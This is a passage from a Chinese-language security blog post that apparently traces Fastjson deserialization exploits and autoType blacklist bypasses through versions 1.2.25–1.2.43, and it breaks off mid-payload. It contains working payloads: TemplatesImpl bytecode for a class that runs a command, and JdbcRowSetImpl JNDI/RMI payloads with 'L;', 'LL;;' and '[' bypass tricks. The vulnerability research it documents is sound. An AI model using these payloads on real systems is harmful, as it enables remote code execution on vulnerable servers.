class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50&quot;</span> +<br>                <span class="hljs-string">&quot;ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACAB&quot;</span> +<br>                <span class="hljs-string">&quot;AKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4v&quot;</span> +<br>                <span class="hljs-string">&quot;b3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAI&quot;</span> +<br>                <span class="hljs-string">&quot;PGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACWV2aWwuamF2YQwACQAK&quot;</span> +<br>                <span class="hljs-string">&quot;BwAhDAAiACMBAARjYWxjDAAkACUBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAmAAoBAARldmlsAQBA&quot;</span> +<br>                <span class="hljs-string">&quot;Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RU&quot;</span> +<br>                <span class="hljs-string">&quot;cmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xl&quot;</span> +<br>                <span class="hljs-string">&quot;dEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;Zy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2Vz&quot;</span> +<br>                <span class="hljs-string">&quot;czsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAAHQABAAEAAAAFKrcA&quot;</span> +<br>                <span class="hljs-string">&quot;AbEAAAABAAwAAAAGAAEAAAAHAAEADQAOAAIACwAAABkAAAADAAAAAbEAAAABAAwAAAAGAAEAAAAT&quot;</span> +<br>                <span class="hljs-string">&quot;AA8AAAAEAAEAEAABAA0AEQACAAsAAAAZAAAABAAAAAGxAAAAAQAMAAAABgABAAAAGAAPAAAABAAB&quot;</span> +<br>                <span class="hljs-string">&quot;ABAACAASAAoAAQALAAAATwACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQACAAwA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAWAAUAAAAKAAkADQAMAAsADQAMABEADgATAAAABwACTAcAFAQAAQAVAAAAAgAW\&quot;] ,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_name\&quot;:\&quot;lingx5\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_tfactory\&quot;:&#123; &#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parseObject(payload,Feature.SupportNonPublicField);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意：这里要注意 json 字符串的字段顺序，<code>_outputProperties</code> 一定要放在最后面。因为 fastjson 往往会按照 JSON 字符串中属性出现的顺序，依次调用对应的 setter 方法进行赋值。</p></blockquote><p><span style="color:#FF0000;"> 你是否有疑惑：为什么要用 <code>&#123;&#125;</code> 呢？</span></p><p>这是因为：当 Fastjson 遇到 JSON 对象 <code>&#123;&#125;</code> 时，它会尝试将其反序列化为 Java 对象。  默认情况下，如果目标字段的类型是接口 (如 <code>TransformerFactory</code>, <code>Map</code>) 或抽象类，Fastjson 可能会选择反序列化为一个默认的实现类。</p><p>成功执行</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321192757502.png" alt="image-20250321192757502" style="zoom:50%;" /><p>我使用的恶意类</p><p><strong>evil</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>注意编译版本和运行 fastjson 的 java 版本，大版本要相同。否则无法 defineClass()</p></blockquote><p><strong>Class2Bytes</strong></p><p>工具类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Class2Bytes</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-type">byte</span>[] class2bytes(File classFile) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(classFile);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">bytesRead</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(bytes, <span class="hljs-number">0</span>, <span class="hljs-number">4096</span>)) != -<span class="hljs-number">1</span>) &#123;<br>                baos.write(bytes, <span class="hljs-number">0</span>, bytesRead);<br>            &#125;<br>            <span class="hljs-type">byte</span>[] classBytes = baos.toByteArray();<br>            <span class="hljs-keyword">return</span> classBytes;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;转换出错: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class2Bytes</span> <span class="hljs-variable">c2b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class2Bytes</span>();<br>        <span class="hljs-type">byte</span>[] bytes = c2b.class2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/com/lingx5/exp/evil.class&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilB64</span> <span class="hljs-operator">=</span> Base64.encode(bytes);<br>        System.out.println(evilB64);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h3><p>Fastjson 1.2.25 官方引入了 <strong>checkAutoType()</strong>，默认情况下禁用了 <code>autotype</code> 功能。而打开 autotype 之后，引入了一系列黑名单来实现防御，但是黑名单的防御机制肯定是有缺陷的，所以 fastjson 也提供了添加黑名单的接口，让用户可以自己添加。</p><p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject 检测到 @type，会先去执行 com.alibaba.fastjson.parser.ParserConfig#checkAutoType</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321201529837.png" alt="image-20250321201529837"></p><p>让我们看看他是如何检测的，首先是在 autoType 为 true 时，也就是支持@type 注解</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321211311630.png" alt="image-20250321211311630" style="zoom:50%;" /><p>而它里面有黑名单和用户自定义的白名单</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321202218735.png" alt="image-20250321202218735" style="zoom:50%;" /><p><strong>加入的黑名单</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">0</span> = <span class="hljs-string">&quot;bsh&quot;</span><br><span class="hljs-number">1</span> = <span class="hljs-string">&quot;com.mchange&quot;</span><br><span class="hljs-number">2</span> = <span class="hljs-string">&quot;com.sun.&quot;</span><br><span class="hljs-number">3</span> = <span class="hljs-string">&quot;java.lang.Thread&quot;</span><br><span class="hljs-number">4</span> = <span class="hljs-string">&quot;java.net.Socket&quot;</span><br><span class="hljs-number">5</span> = <span class="hljs-string">&quot;java.rmi&quot;</span><br><span class="hljs-number">6</span> = <span class="hljs-string">&quot;javax.xml&quot;</span><br><span class="hljs-number">7</span> = <span class="hljs-string">&quot;org.apache.bcel&quot;</span><br><span class="hljs-number">8</span> = <span class="hljs-string">&quot;org.apache.commons.beanutils&quot;</span><br><span class="hljs-number">9</span> = <span class="hljs-string">&quot;org.apache.commons.collections.Transformer&quot;</span><br><span class="hljs-number">10</span> = <span class="hljs-string">&quot;org.apache.commons.collections.functors&quot;</span><br><span class="hljs-number">11</span> = <span class="hljs-string">&quot;org.apache.commons.collections4.comparators&quot;</span><br><span class="hljs-number">12</span> = <span class="hljs-string">&quot;org.apache.commons.fileupload&quot;</span><br><span class="hljs-number">13</span> = <span class="hljs-string">&quot;org.apache.myfaces.context.servlet&quot;</span><br><span class="hljs-number">14</span> = <span class="hljs-string">&quot;org.apache.tomcat&quot;</span><br><span class="hljs-number">15</span> = <span class="hljs-string">&quot;org.apache.wicket.util&quot;</span><br><span class="hljs-number">16</span> = <span class="hljs-string">&quot;org.codehaus.groovy.runtime&quot;</span><br><span class="hljs-number">17</span> = <span class="hljs-string">&quot;org.hibernate&quot;</span><br><span class="hljs-number">18</span> = <span class="hljs-string">&quot;org.jboss&quot;</span><br><span class="hljs-number">19</span> = <span class="hljs-string">&quot;org.mozilla.javascript&quot;</span><br><span class="hljs-number">20</span> = <span class="hljs-string">&quot;org.python.core&quot;</span><br><span class="hljs-number">21</span> = <span class="hljs-string">&quot;org.springframework&quot;</span><br></code></pre></td></tr></table></figure><p>当然，我们主要来绕过支持 autoType 时，白名单为空，我们的恶意类肯定是不在白名单中的。而我们要绕过黑名单，就会来到判断完之后的 com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321211937113.png" alt="image-20250321211937113"></p><p>进去之后，就有我们之前说的 <code>[</code> 和 <code>L</code>，<code>;</code> 的判断和截取</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321212115561.png" alt="image-20250321212115561"></p><p>所以可以使用 <code>L</code>，<code>;</code> 来进行绕过</p><p><strong>bypass25</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass25</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250321213135171.png" alt="image-20250321213135171"></p><h3 id="1-2-42"><a href="#1-2-42" class="headerlink" title="1.2.42"></a>1.2.42</h3><p>作者把黑名单做了 hash 处理，目的就是为了让安全研究者不能看到具体的黑名单类名</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322090734643.png" alt="image-20250322090734643"></p><p>同时在 checkAutoType 过滤 <code>L</code> 和 <code>;</code> 时, 也把字符做了 hash 处理，并用异或进行处理</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322093727745.png" alt="image-20250322093727745"></p><p>其实我们可以写一个 test 来测试一下这段代码</p><p><strong>hashTest</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hashTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> <span class="hljs-number">0xcbf29ce484222325L</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x100000001b3L</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lcom.example.Poc;&quot;</span>;<br><br>        <span class="hljs-comment">// 计算哈希值</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">calculatedHash</span> <span class="hljs-operator">=</span> (((BASIC<br>                ^ className.charAt(<span class="hljs-number">0</span>)) <span class="hljs-comment">// 步骤 1: BASIC 异或 第一个字符 &#x27;L&#x27;</span><br>                * PRIME)              <span class="hljs-comment">// 步骤 2: 步骤 1 的结果 乘以 PRIME</span><br>                ^ className.charAt(className.length() - <span class="hljs-number">1</span>)) <span class="hljs-comment">// 步骤 3: 步骤 2 的结果 异或 最后一个字符 &#x27;;&#x27;</span><br>                * PRIME;              <span class="hljs-comment">// 步骤 4: 步骤 3 的结果 乘以 PRIME</span><br><br>        <span class="hljs-type">long</span> <span class="hljs-variable">expectedHash</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x9198507b5af98f0L</span>; <span class="hljs-comment">// 目标哈希值</span><br><br>        <span class="hljs-keyword">if</span> (calculatedHash == expectedHash) &#123; <span class="hljs-comment">// 比较计算出的哈希值和目标哈希值</span><br>            className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>); <span class="hljs-comment">// 如果相等，则移除首尾字符</span><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;Calculated Hash: 0x&quot;</span> + Long.toHexString(calculatedHash));<br>        System.out.println(<span class="hljs-string">&quot;Expected Hash:   0x&quot;</span> + Long.toHexString(expectedHash));<br>        System.out.println(<span class="hljs-string">&quot;className after if: &quot;</span> + className);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看输出结果</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322093955373.png" alt="image-20250322093955373" style="zoom:67%;" /><p>可以看到在 checkAutoType 中 hash 计算的代码就是去除了首位的 <code>L</code> 和 <code>;</code>，然后再去判断白名单和黑名单</p><p>不过作者忽略了一点，在 com.alibaba.fastjson.util.TypeUtils#loadClass 方法中是递归处理 <code>L</code> 和 <code>;</code> 的</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322094320015.png" alt="image-20250322094320015"></p><p>所以基本上我们双写就能绕过了</p><p><strong>bypass25</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass25</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322094711797.png" alt="image-20250322094711797"></p><h3 id="1-2-43"><a href="#1-2-43" class="headerlink" title="1.2.43"></a>1.2.43</h3><p>在 fastjson-1.2.43 中，作者对双写绕过进行了修复。在 checkAutoType 判断中加入了遇到 <code>LL</code> 开头的类，就抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3750763034362895579L</span>;<br><span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">1099511628211L</span>;<br> <span class="hljs-comment">// 判断 L开头 ;结尾</span><br><span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(className.length() - <span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655701488918567152L</span>) &#123;<br>    <span class="hljs-comment">// 判断 LL开头</span><br>    <span class="hljs-keyword">if</span> (((-<span class="hljs-number">3750763034362895579L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">0</span>)) * <span class="hljs-number">1099511628211L</span> ^ (<span class="hljs-type">long</span>)className.charAt(<span class="hljs-number">1</span>)) * <span class="hljs-number">1099511628211L</span> == <span class="hljs-number">655656408941810501L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br><br>    className = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们自然会想到 com.alibaba.fastjson.util.TypeUtils#loadClass 对 <code>[</code> 符号的处理，你能从这里绕过吗?</p><p>答案肯定是可以的</p><p>我们尝试加一个 <code>[</code> 调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass43</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;autoCommit\&quot;:true&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250322143816594.png" alt="image-20250322143816594"></p><p>他在 parseArray 的时候报错了，期盼一个 <code>[</code> 符号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exepct <span class="hljs-string">&#x27;[&#x27;</span>, but ,, pos <span class="hljs-number">42</span>, json : &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br></code></pre></td></tr></table></figure><p>我们肯定希望绕过报错信息，在 42 <code>,</code> 的位置插入 <code>[</code> 符号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bypass43</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, 